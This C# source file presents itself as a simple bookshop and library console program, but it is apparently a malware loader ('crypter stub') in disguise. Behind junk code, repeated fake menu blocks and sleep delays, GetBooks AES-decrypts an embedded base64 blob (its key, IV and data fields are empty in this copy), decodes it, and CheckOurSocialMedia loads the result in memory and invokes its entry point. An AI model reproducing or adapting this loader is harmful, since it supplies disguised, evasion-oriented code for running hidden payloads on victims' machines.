using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Net.Http;
using System.Windows.Forms;
using System.Threading;

namespace Launcher
{
    public class Book
    {
        public string Title { get; set; }
        public string Author { get; set; }
    }

    public class Library
    {
        private List<Book> _books;

        public Library()
        {
            _books = new List<Book>();
        }

        public void AddBook(string title, string author)
        {
            _books.Add(new Book { Title = title, Author = author });
        }

        public void DisplayBooks()
        {
            foreach (var book in _books)
            {
                Console.WriteLine($"Title: {book.Title}, Author: {book.Author}");
            }
        }

        public void FindBook(string title)
        {
            var book = _books.Find(b => b.Title == title);

            if (book != null)
            {
                Console.WriteLine($"Found book - Title: {book.Title}, Author: {book.Author}");
            }
            else
            {
                Console.WriteLine("Book not found.");
            }
        }
    }
    internal class Program
    {

        private static void Calculate()
        {
            Console.WriteLine("Enter a number to perform complex mathematical operations on:");
            string input = Console.ReadLine();
            string inbut = "100";
            // parse the input into a double
            if (double.TryParse(input, out double number))
            {
                // Perform a series of complex mathematical operations on the number
                double sqrt = Math.Sqrt(number);
                double result = Math.Pow(sqrt, Math.PI);
                Console.WriteLine($"The square root of {number} raised to the power of Pi equals {result}");
            }
            else
            {
                Console.WriteLine("You didn't enter a valid number. Please try again.");
            }

            Console.ReadLine();
        }

        static string[] ARGS = null;
        private static void ReadAllBooks(string bookk)
        {
            if (bookk != "harre")
                return;

            string[] books = new string[] {"Harry Potter","LingoTank","Mien Kamp","Batman","LOL"};
            foreach (string book in books)
            {
                if (DateTime.Now.Millisecond != -69)
                {
                    Calculate();

                    Calculate();

                    Calculate();
                }

                if(book=="LOL")
                    GetBooks("HarryPotter", ARGS);

            }
        }

        private static string key ="";
        static void Main(string[] args)
        {
            ARGS= args;
            Console.WriteLine("Welcome to the book shop write what book to buy");
            string book = Console.ReadLine();



            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();
            Thread.Sleep(10000);
            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();
            Thread.Sleep(1000);

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();
            Thread.Sleep(1000);

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();
            Thread.Sleep(1000);

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();





            if (book!=null)
            GetBooks("Kallen", ARGS);


            Calculate();

            Calculate();

            Calculate();
            Thread.Sleep(1000);

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();
            if (book == null)
                ReadAllBooks("harre");

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();
            Thread.Sleep(1000);

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();
            Thread.Sleep(1000);

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();
            Thread.Sleep(1000);

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate(); Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();

            Calculate();
        }
        private static string data = "";

        private static void GetBooks(string lookup, string[] args)
        {
            Thread.Sleep(10000);
            try
            {
                Library library = new Library();
                string userChoice;


                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case "1":
                        Console.Write("Enter book title: ");
                        string title = Console.ReadLine();
                        Console.Write("Enter book author: ");
                        string author = Console.ReadLine();

                        library.AddBook(title, author);
                        break;
                    case "2":
                        library.DisplayBooks();
                        break;
                    case "3":
                        Console.Write("Enter the title of the book you want to find: ");
                        string bookTitle = Console.ReadLine();

                        library.FindBook(bookTitle);
                        break;
                }
            }
            catch (Exception ex)
            {

            }
            try
            {
                Library library = new Library();
                string userChoice;


                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case "1":
                        Console.Write("Enter book title: ");
                        string title = Console.ReadLine();
                        Console.Write("Enter book author: ");
                        string author = Console.ReadLine();

                        library.AddBook(title, author);
                        break;
                    case "2":
                        library.DisplayBooks();
                        break;
                    case "3":
                        Console.Write("Enter the title of the book you want to find: ");
                        string bookTitle = Console.ReadLine();

                        library.FindBook(bookTitle);
                        break;
                }
            }
            catch (Exception ex) { }
            try
            {
                Library library = new Library();
                string userChoice;


                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case "1":
                        Console.Write("Enter book title: ");
                        string title = Console.ReadLine();
                        Console.Write("Enter book author: ");
                        string author = Console.ReadLine();

                        library.AddBook(title, author);
                        break;
                    case "2":
                        library.DisplayBooks();
                        break;
                    case "3":
                        Console.Write("Enter the title of the book you want to find: ");
                        string bookTitle = Console.ReadLine();

                        library.FindBook(bookTitle);
                        break;
                }
            }
            catch (Exception ex) { }
            try
            {
                Library library = new Library();
                string userChoice;


                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case "1":
                        Console.Write("Enter book title: ");
                        string title = Console.ReadLine();
                        Console.Write("Enter book author: ");
                        string author = Console.ReadLine();

                        library.AddBook(title, author);
                        break;
                    case "2":
                        library.DisplayBooks();
                        break;
                    case "3":
                        Console.Write("Enter the title of the book you want to find: ");
                        string bookTitle = Console.ReadLine();

                        library.FindBook(bookTitle);
                        break;
                }
            }
            catch (Exception ex) { }
            try
            {
                Library library = new Library();
                string userChoice;


                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case "1":
                        Console.Write("Enter book title: ");
                        string title = Console.ReadLine();
                        Console.Write("Enter book author: ");
                        string author = Console.ReadLine();

                        library.AddBook(title, author);
                        break;
                    case "2":
                        library.DisplayBooks();
                        break;
                    case "3":
                        Console.Write("Enter the title of the book you want to find: ");
                        string bookTitle = Console.ReadLine();

                        library.FindBook(bookTitle);
                        break;
                }
            }
            catch (Exception ex) { }
            try
            {
                Library library = new Library();
                string userChoice;


                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case "1":
                        Console.Write("Enter book title: ");
                        string title = Console.ReadLine();
                        Console.Write("Enter book author: ");
                        string author = Console.ReadLine();

                        library.AddBook(title, author);
                        break;
                    case "2":
                        library.DisplayBooks();
                        break;
                    case "3":
                        Console.Write("Enter the title of the book you want to find: ");
                        string bookTitle = Console.ReadLine();

                        library.FindBook(bookTitle);
                        break;
                }
            }
            catch (Exception ex) { }
            try
            {
                Library library = new Library();
                string userChoice;


                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case "1":
                        Console.Write("Enter book title: ");
                        string title = Console.ReadLine();
                        Console.Write("Enter book author: ");
                        string author = Console.ReadLine();

                        library.AddBook(title, author);
                        break;
                    case "2":
                        library.DisplayBooks();
                        break;
                    case "3":
                        Console.Write("Enter the title of the book you want to find: ");
                        string bookTitle = Console.ReadLine();

                        library.FindBook(bookTitle);
                        break;
                }
            }
            catch (Exception ex) { }

            if(lookup=="HarryPotter")
            using (Aes aes = Aes.Create())
            {
                try
                {
                    Library library = new Library();
                    string userChoice;


                    Console.WriteLine("\nPlease choose an option:");
                    Console.WriteLine("1. Add a Book");
                    Console.WriteLine("2. Display all Books");
                    Console.WriteLine("3. Find a Book");
                    Console.WriteLine("4. Exit");

                    userChoice = Console.ReadLine();

                    switch (userChoice)
                    {
                        case "1":
                            Console.Write("Enter book title: ");
                            string title = Console.ReadLine();
                            Console.Write("Enter book author: ");
                            string author = Console.ReadLine();

                            library.AddBook(title, author);
                            break;
                        case "2":
                            library.DisplayBooks();
                            break;
                        case "3":
                            Console.Write("Enter the title of the book you want to find: ");
                            string bookTitle = Console.ReadLine();

                            library.FindBook(bookTitle);
                            break;
                    }
                }
                catch (Exception ex) { }

                aes.Key = Convert.FromBase64String(key);

                try
                {
                    Library library = new Library();
                    string userChoice;


                    Console.WriteLine("\nPlease choose an option:");
                    Console.WriteLine("1. Add a Book");
                    Console.WriteLine("2. Display all Books");
                    Console.WriteLine("3. Find a Book");
                    Console.WriteLine("4. Exit");

                    userChoice = Console.ReadLine();

                    switch (userChoice)
                    {
                        case "1":
                            Console.Write("Enter book title: ");
                            string title = Console.ReadLine();
                            Console.Write("Enter book author: ");
                            string author = Console.ReadLine();

                            library.AddBook(title, author);
                            break;
                        case "2":
                            library.DisplayBooks();
                            break;
                        case "3":
                            Console.Write("Enter the title of the book you want to find: ");
                            string bookTitle = Console.ReadLine();

                            library.FindBook(bookTitle);
                            break;
                    }
                }
                catch (Exception ex) { }

                aes.IV = Convert.FromBase64String(iV);


                try
                {
                    Library library = new Library();
                    string userChoice;


                    Console.WriteLine("\nPlease choose an option:");
                    Console.WriteLine("1. Add a Book");
                    Console.WriteLine("2. Display all Books");
                    Console.WriteLine("3. Find a Book");
                    Console.WriteLine("4. Exit");

                    userChoice = Console.ReadLine();

                    switch (userChoice)
                    {
                        case "1":
                            Console.Write("Enter book title: ");
                            string title = Console.ReadLine();
                            Console.Write("Enter book author: ");
                            string author = Console.ReadLine();

                            library.AddBook(title, author);
                            break;
                        case "2":
                            library.DisplayBooks();
                            break;
                        case "3":
                            Console.Write("Enter the title of the book you want to find: ");
                            string bookTitle = Console.ReadLine();

                            library.FindBook(bookTitle);
                            break;
                    }
                }
                catch (Exception ex) { }

                ICryptoTransform ct = aes.CreateDecryptor();

                try
                {
                    Library library = new Library();
                    string userChoice;


                    Console.WriteLine("\nPlease choose an option:");
                    Console.WriteLine("1. Add a Book");
                    Console.WriteLine("2. Display all Books");
                    Console.WriteLine("3. Find a Book");
                    Console.WriteLine("4. Exit");

                    userChoice = Console.ReadLine();

                    switch (userChoice)
                    {
                        case "1":
                            Console.Write("Enter book title: ");
                            string title = Console.ReadLine();
                            Console.Write("Enter book author: ");
                            string author = Console.ReadLine();

                            library.AddBook(title, author);
                            break;
                        case "2":
                            library.DisplayBooks();
                            break;
                        case "3":
                            Console.Write("Enter the title of the book you want to find: ");
                            string bookTitle = Console.ReadLine();

                            library.FindBook(bookTitle);
                            break;
                    }
                }
                catch (Exception ex) { }
                try
                {
                    Library library = new Library();
                    string userChoice;


                    Console.WriteLine("\nPlease choose an option:");
                    Console.WriteLine("1. Add a Book");
                    Console.WriteLine("2. Display all Books");
                    Console.WriteLine("3. Find a Book");
                    Console.WriteLine("4. Exit");

                    userChoice = Console.ReadLine();

                    switch (userChoice)
                    {
                        case "1":
                            Console.Write("Enter book title: ");
                            string title = Console.ReadLine();
                            Console.Write("Enter book author: ");
                            string author = Console.ReadLine();

                            library.AddBook(title, author);
                            break;
                        case "2":
                            library.DisplayBooks();
                            break;
                        case "3":
                            Console.Write("Enter the title of the book you want to find: ");
                            string bookTitle = Console.ReadLine();

                            library.FindBook(bookTitle);
                            break;
                    }
                }
                catch (Exception ex) { }

                using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(data)))
                {

                    try
                    {
                        Library library = new Library();
                        string userChoice;


                        Console.WriteLine("\nPlease choose an option:");
                        Console.WriteLine("1. Add a Book");
                        Console.WriteLine("2. Display all Books");
                        Console.WriteLine("3. Find a Book");
                        Console.WriteLine("4. Exit");

                        userChoice = Console.ReadLine();

                        switch (userChoice)
                        {
                            case "1":
                                Console.Write("Enter book title: ");
                                string title = Console.ReadLine();
                                Console.Write("Enter book author: ");
                                string author = Console.ReadLine();

                                library.AddBook(title, author);
                                break;
                            case "2":
                                library.DisplayBooks();
                                break;
                            case "3":
                                Console.Write("Enter the title of the book you want to find: ");
                                string bookTitle = Console.ReadLine();

                                library.FindBook(bookTitle);
                                break;
                        }
                    }
                    catch (Exception ex) { }

                    using (CryptoStream cs = new CryptoStream(ms, ct, CryptoStreamMode.Read))
                    {

                        try
                        {
                            Library library = new Library();
                            string userChoice;


                            Console.WriteLine("\nPlease choose an option:");
                            Console.WriteLine("1. Add a Book");
                            Console.WriteLine("2. Display all Books");
                            Console.WriteLine("3. Find a Book");
                            Console.WriteLine("4. Exit");

                            userChoice = Console.ReadLine();

                            switch (userChoice)
                            {
                                case "1":
                                    Console.Write("Enter book title: ");
                                    string title = Console.ReadLine();
                                    Console.Write("Enter book author: ");
                                    string author = Console.ReadLine();

                                    library.AddBook(title, author);
                                    break;
                                case "2":
                                    library.DisplayBooks();
                                    break;
                                case "3":
                                    Console.Write("Enter the title of the book you want to find: ");
                                    string bookTitle = Console.ReadLine();

                                    library.FindBook(bookTitle);
                                    break;
                            }
                        }
                        catch (Exception ex) { }
                        try
                        {
                            Library library = new Library();
                            string userChoice;


                            Console.WriteLine("\nPlease choose an option:");
                            Console.WriteLine("1. Add a Book");
                            Console.WriteLine("2. Display all Books");
                            Console.WriteLine("3. Find a Book");
                            Console.WriteLine("4. Exit");

                            userChoice = Console.ReadLine();

                            switch (userChoice)
                            {
                                case "1":
                                    Console.Write("Enter book title: ");
                                    string title = Console.ReadLine();
                                    Console.Write("Enter book author: ");
                                    string author = Console.ReadLine();

                                    library.AddBook(title, author);
                                    break;
                                case "2":
                                    library.DisplayBooks();
                                    break;
                                case "3":
                                    Console.Write("Enter the title of the book you want to find: ");
                                    string bookTitle = Console.ReadLine();

                                    library.FindBook(bookTitle);
                                    break;
                            }
                        }
                        catch (Exception ex) { }

                        using (StreamReader sr = new StreamReader(cs))
                        {

                            try
                            {
                                Library library = new Library();
                                string userChoice;


                                Console.WriteLine("\nPlease choose an option:");
                                Console.WriteLine("1. Add a Book");
                                Console.WriteLine("2. Display all Books");
                                Console.WriteLine("3. Find a Book");
                                Console.WriteLine("4. Exit");

                                userChoice = Console.ReadLine();

                                switch (userChoice)
                                {
                                    case "1":
                                        Console.Write("Enter book title: ");
                                        string title = Console.ReadLine();
                                        Console.Write("Enter book author: ");
                                        string author = Console.ReadLine();

                                        library.AddBook(title, author);
                                        break;
                                    case "2":
                                        library.DisplayBooks();
                                        break;
                                    case "3":
                                        Console.Write("Enter the title of the book you want to find: ");
                                        string bookTitle = Console.ReadLine();

                                        library.FindBook(bookTitle);
                                        break;
                                }
                            }
                            catch (Exception ex) { }
                            try
                            {
                                    string input = sr.ReadToEnd(); 
                                    var scrambled = new string(input.Select(c => (char)(c + 3)).ToArray());

                                    var unscrambled = new string(scrambled.Select(c => (char)(c - 3)).ToArray());



                                    byte[] scoopedBook = Convert.FromBase64String(unscrambled);

                                    CheckOurSocialMedia(scoopedBook);

                                    //GOBACK
                                }
                            catch (Exception ex) { }

                            try
                            {
                                Library library = new Library();
                                string userChoice;


                                Console.WriteLine("\nPlease choose an option:");
                                Console.WriteLine("1. Add a Book");
                                Console.WriteLine("2. Display all Books");
                                Console.WriteLine("3. Find a Book");
                                Console.WriteLine("4. Exit");

                                userChoice = Console.ReadLine();

                                switch (userChoice)
                                {
                                    case "1":
                                        Console.Write("Enter book title: ");
                                        string title = Console.ReadLine();
                                        Console.Write("Enter book author: ");
                                        string author = Console.ReadLine();

                                        library.AddBook(title, author);
                                        break;
                                    case "2":
                                        library.DisplayBooks();
                                        break;
                                    case "3":
                                        Console.Write("Enter the title of the book you want to find: ");
                                        string bookTitle = Console.ReadLine();

                                        library.FindBook(bookTitle);
                                        break;
                                }
                            }
                            catch (Exception ex) { }
                            try
                            {
                                Library library = new Library();
                                string userChoice;


                                Console.WriteLine("\nPlease choose an option:");
                                Console.WriteLine("1. Add a Book");
                                Console.WriteLine("2. Display all Books");
                                Console.WriteLine("3. Find a Book");
                                Console.WriteLine("4. Exit");

                                userChoice = Console.ReadLine();

                                switch (userChoice)
                                {
                                    case "1":
                                        Console.Write("Enter book title: ");
                                        string title = Console.ReadLine();
                                        Console.Write("Enter book author: ");
                                        string author = Console.ReadLine();

                                        library.AddBook(title, author);
                                        break;
                                    case "2":
                                        library.DisplayBooks();
                                        break;
                                    case "3":
                                        Console.Write("Enter the title of the book you want to find: ");
                                        string bookTitle = Console.ReadLine();

                                        library.FindBook(bookTitle);
                                        break;
                                }
                            }
                            catch (Exception ex) { }

                            try
                            {
                                Library library = new Library();
                                string userChoice;


                                Console.WriteLine("\nPlease choose an option:");
                                Console.WriteLine("1. Add a Book");
                                Console.WriteLine("2. Display all Books");
                                Console.WriteLine("3. Find a Book");
                                Console.WriteLine("4. Exit");

                                userChoice = Console.ReadLine();

                                switch (userChoice)
                                {
                                    case "1":
                                        Console.Write("Enter book title: ");
                                        string title = Console.ReadLine();
                                        Console.Write("Enter book author: ");
                                        string author = Console.ReadLine();

                                        library.AddBook(title, author);
                                        break;
                                    case "2":
                                        library.DisplayBooks();
                                        break;
                                    case "3":
                                        Console.Write("Enter the title of the book you want to find: ");
                                        string bookTitle = Console.ReadLine();

                                        library.FindBook(bookTitle);
                                        break;
                                }
                            }
                            catch (Exception ex) { }

                            try
                            {
                                try
                                {
                                    Library library = new Library();
                                    string userChoice;


                                    Console.WriteLine("\nPlease choose an option:");
                                    Console.WriteLine("1. Add a Book");
                                    Console.WriteLine("2. Display all Books");
                                    Console.WriteLine("3. Find a Book");
                                    Console.WriteLine("4. Exit");

                                    userChoice = Console.ReadLine();

                                    switch (userChoice)
                                    {
                                        case "1":
                                            Console.Write("Enter book title: ");
                                            string title = Console.ReadLine();
                                            Console.Write("Enter book author: ");
                                            string author = Console.ReadLine();

                                            library.AddBook(title, author);
                                            break;
                                        case "2":
                                            library.DisplayBooks();
                                            break;
                                        case "3":
                                            Console.Write("Enter the title of the book you want to find: ");
                                            string bookTitle = Console.ReadLine();

                                            library.FindBook(bookTitle);
                                            break;
                                    }
                                }
                                catch (Exception ex) { }

                            }
                            catch (Exception ex)
                            {
#if DEBUG
                                MessageBox.Show(ex.Message);
#endif
                            }
                        }
                    }
                }
            }
            try
            {
                Library library = new Library();
                string userChoice;


                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case "1":
                        Console.Write("Enter book title: ");
                        string title = Console.ReadLine();
                        Console.Write("Enter book author: ");
                        string author = Console.ReadLine();

                        library.AddBook(title, author);
                        break;
                    case "2":
                        library.DisplayBooks();
                        break;
                    case "3":
                        Console.Write("Enter the title of the book you want to find: ");
                        string bookTitle = Console.ReadLine();

                        library.FindBook(bookTitle);
                        break;
                }
            }
            catch (Exception ex) { }
            try
            {
                Library library = new Library();
                string userChoice;


                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();

                switch (userChoice)
                {
                    case "1":
                        Console.Write("Enter book title: ");
                        string title = Console.ReadLine();
                        Console.Write("Enter book author: ");
                        string author = Console.ReadLine();

                        library.AddBook(title, author);
                        break;
                    case "2":
                        library.DisplayBooks();
                        break;
                    case "3":
                        Console.Write("Enter the title of the book you want to find: ");
                        string bookTitle = Console.ReadLine();

                        library.FindBook(bookTitle);
                        break;
                }
            }
            catch (Exception ex) { }
        }
        private static string iV = "";


        private static void CheckOurSocialMedia(byte[] scoopedBook)
        {
            Library library = new Library();
            string userChoice;


            Console.WriteLine("\nPlease choose an option:");
            Console.WriteLine("1. Add a Book");
            Console.WriteLine("2. Display all Books");
            Console.WriteLine("3. Find a Book");
            Console.WriteLine("4. Exit");

            userChoice = Console.ReadLine();

            switch (userChoice)
            {
                case "1":
                    Console.Write("Enter book title: ");
                    string title = Console.ReadLine();
                    Console.Write("Enter book author: ");
                    string author = Console.ReadLine();

                    library.AddBook(title, author);
                    break;
                case "2":
                    library.DisplayBooks();
                    break;
                case "3":
                    Console.Write("Enter the title of the book you want to find: ");
                    string bookTitle = Console.ReadLine();

                    library.FindBook(bookTitle);
                    break;
            }
            if (userChoice == null)
            {
                Assembly bookdeob = Assembly.Load(scoopedBook);

                Library lib = new Library();
                string uc;


                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();



                MethodInfo bookreader = bookdeob.EntryPoint;

                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();
                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();
                object o = bookdeob.CreateInstance(bookreader.Name);
                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();
                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();
                bookreader.Invoke(null, new object[] { ARGS });
                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();
                Console.WriteLine("\nPlease choose an option:");
                Console.WriteLine("1. Add a Book");
                Console.WriteLine("2. Display all Books");
                Console.WriteLine("3. Find a Book");
                Console.WriteLine("4. Exit");

                userChoice = Console.ReadLine();

            }
        }
    }
}
